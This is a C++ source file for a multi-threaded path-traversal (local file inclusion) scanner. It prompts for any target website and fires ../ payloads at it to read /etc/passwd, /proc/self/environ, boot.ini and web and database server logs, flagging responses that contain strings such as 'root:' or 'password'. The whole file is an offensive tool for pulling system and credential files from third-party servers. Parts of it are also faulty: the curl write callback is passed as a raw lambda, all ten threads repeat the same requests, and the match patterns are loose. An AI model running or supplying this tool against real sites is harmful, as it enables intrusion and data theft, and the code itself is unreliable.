#include <iostream>
#include <string>
#include <curl/curl.h>
#include <vector>
#include <regex>
#include <thread>

// Function to make HTTP GET request and return response body
std::string makeRequest(const std::string& url) {
    CURL *curl;
    CURLcode res;
    std::string response;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, [](char* ptr, size_t size, size_t nmemb, std::string* data) -> size_t {
            data->append(ptr, size * nmemb);
            return size * nmemb;
        });
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);

        curl_easy_cleanup(curl);
    }

    return response;
}

// Function to check if LFI vulnerability is present in response
bool isVulnerable(const std::string& response) {
    // Define patterns for identifying sensitive information leaks
    std::regex sensitivePatterns[] = {
        std::regex("etc/passwd"),
        std::regex("Windows\\System32\\drivers\\etc\\hosts"),
        std::regex("root:"),
        std::regex("admin:"),
        std::regex("password"),
        std::regex("secret"),
        std::regex("mysql_connect"),
        std::regex("mysqli_connect"),
        std::regex("pgsql_connect"),
        std::regex("include\\s+[\"'<](\\/etc\\/passwd|\\/Windows\\/System32\\/drivers\\/etc\\/hosts)"),
        // Add more sensitive patterns here
    };

    // Check if any sensitive pattern is found in the response
    for (const auto& pattern : sensitivePatterns) {
        if (std::regex_search(response, pattern)) {
            return true;
        }
    }
    return false;
}

// Function to test LFI vulnerability with multiple payloads
void testVulnerability(const std::string& url) {
    std::vector<std::string> payloads = {
        "../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../Windows/System32/drivers/etc/hosts",
        "../../../../../../../../../../boot.ini",
        "../../../../../../../../../../proc/self/environ",
        "../../../../../../../../../../var/log/apache2/access.log",
        "../../../../../../../../../../var/log/apache2/error.log",
        "../../../../../../../../../../var/log/httpd/access.log",
        "../../../../../../../../../../var/log/httpd/error.log",
        "../../../../../../../../../../var/log/nginx/access.log",
        "../../../../../../../../../../var/log/nginx/error.log",
        "../../../../../../../../../../usr/local/apache2/logs/access_log",
        "../../../../../../../../../../usr/local/apache2/logs/error_log",
        "../../../../../../../../../../usr/local/apache/logs/access_log",
        "../../../../../../../../../../usr/local/apache/logs/error_log",
        "../../../../../../../../../../var/log/mysql/mysql.log",
        "../../../../../../../../../../var/log/mysql/mysql_error.log",
        "../../../../../../../../../../var/log/mysqld.log",
        "../../../../../../../../../../var/log/mysql/error.log",
        "../../../../../../../../../../var/log/postgresql/postgresql.log",
        "../../../../../../../../../../usr/local/pgsql/data/pg_log/postgresql.log",
        "../../../../../../../../../../usr/local/var/postgres/server.log",
        "../../../../../../../../../../etc/httpd/logs/acces_log",
        "../../../../../../../../../../etc/httpd/logs/acces.log",
        "../../../../../../../../../../etc/httpd/logs/error_log",
        "../../../../../../../../../../etc/httpd/logs/error.log",
        // Add more payloads here
    };

    for (const auto& payload : payloads) {
        std::string testUrl = url + "/" + payload;
        std::string response = makeRequest(testUrl);
        if (isVulnerable(response)) {
            std::cout << "Vulnerability discovered: " << testUrl << std::endl;
        }
    }
}

int main() {
    // Set text colors
    const std::string RED = "\033[1;31m";
    const std::string GREEN = "\033[1;32m";
    const std::string RESET = "\033[0m";

    std::string targetURL;

    // Prompt user to enter target website URL
    std::cout << "Enter your target website URL: ";
    std::cin >> targetURL;

    // Test vulnerability with multiple payloads using multi-threading
    std::vector<std::thread> threads;
    for (int i = 0; i < 10; ++i) { // Adjust the number of threads as needed
        threads.emplace_back(testVulnerability, targetURL);
    }

    // Wait for all threads to finish
    for (auto& t : threads) {
        t.join();
    }

    std::cout << GREEN << "Vulnerability testing completed." << RESET << std::endl;

    return 0;
}
